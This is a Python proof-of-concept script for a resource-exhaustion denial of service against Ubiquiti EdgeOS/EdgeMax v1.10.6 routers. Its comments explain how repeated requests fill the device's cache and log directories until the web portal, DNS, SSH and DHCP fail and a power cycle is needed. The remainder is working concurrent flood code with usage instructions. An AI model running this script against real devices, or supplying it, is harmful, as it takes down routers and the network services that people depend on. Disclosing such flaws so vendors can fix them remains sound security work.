# Resource Consumption DOS on Ubiquiti EdgeOS / Edgemax v1.10.6 Proof of Concept
#
# This process fills up the /var/run/beaker/container_file/ directory with unique beaker cache files, and
# then /var/log with complaints about not being able to write to the container_file directory.
# If this script exits due to connection errors it means the web portal is going down, just restart it until dns/ssh/dhcp are inoperable as well.
# The device will need to have it's power cycled in order to recover.
# 
# Usage: python meep.py 'http://edgeosaddres.com/' 50 20000
# (50 represents the amount of threads and 20000 represents the amount of requests, adjust accordingly)

import random
import sys
import asyncio
from aiohttp import ClientSession

beaker = {'beaker.session.id': str(random.randrange(1,99999999999999999999999999999))}
HEADERS = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0',
           'Connection': 'Close'}
print('Meeping target with beaker cookies:')
async def fetch(url, session, cookies=beaker, headers=HEADERS):
    async with session.head(url, verify_ssl=False) as response:
        print('.', end='', flush=True)
        return

async def bound_fetch(sem, url, session):
    async with sem:
        await fetch(url, session)

async def run(r):
    url = str(sys.argv[1])
    tasks = []
    sem = asyncio.Semaphore(int(sys.argv[2]))
    async with ClientSession() as session:
        for i in range(r):
            task = asyncio.ensure_future(bound_fetch(sem, url.format(i), session))
            tasks.append(task)

        responses = asyncio.gather(*tasks)
        await responses

number = int(sys.argv[3])
loop = asyncio.get_event_loop()

future = asyncio.ensure_future(run(number))
loop.run_until_complete(future)

